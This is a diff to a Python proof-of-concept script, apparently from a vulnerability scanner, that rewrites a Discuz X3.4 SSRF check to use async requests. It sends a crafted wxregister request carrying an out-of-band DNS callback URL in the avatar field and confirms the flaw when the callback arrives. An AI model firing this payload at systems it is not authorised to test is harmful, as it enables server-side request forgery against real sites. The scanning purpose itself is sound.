@@ -2,9 +2,10 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-import time
 import random
+import asyncio
 from string import ascii_lowercase
+from lib.utils.connect import ClientSession
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -18,20 +19,21 @@ class POC(Script):
         self.refer = 'https://zhuanlan.zhihu.com/p/51907363, https://www.seebug.org/vuldb/ssvid-97709'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
             path_list = list(set([
                 self.url_normpath(self.base_url, '/'),
                 self.url_normpath(self.url, './'),
             ]))
-            for path in path_list:
-                dns = self.ceye_dns_api()
-                url = path + "/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=%s&wxopenid=%s" %(dns,''.join([random.choice(ascii_lowercase) for _ in range(8)]))
-                res = self.curl('get', url)
-                if res != None :
-                    time.sleep(3)
-                    if self.ceye_verify_api(dns,'http'):
-                        self.flag = 1
-                        self.req.append({"flag": url})
-                        self.res.append({"info": url, "key": "discuz x3.4 ssrf"})
+            async with ClientSession() as session:
+                for path in path_list:
+                    dns = self.ceye_dns_api(t='url')
+                    url = path + "plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=%s&wxopenid=%s" %(dns,''.join([random.choice(ascii_lowercase) for _ in range(8)]))
+                    async with session.get(url=url) as res:
+                        if res != None :
+                            await asyncio.sleep(1)
+                            if await self.ceye_verify_api(dns,'http'):
+                                self.flag = 1
+                                self.req.append({"flag": url})
+                                self.res.append({"info": url, "key": "discuz x3.4 ssrf"})
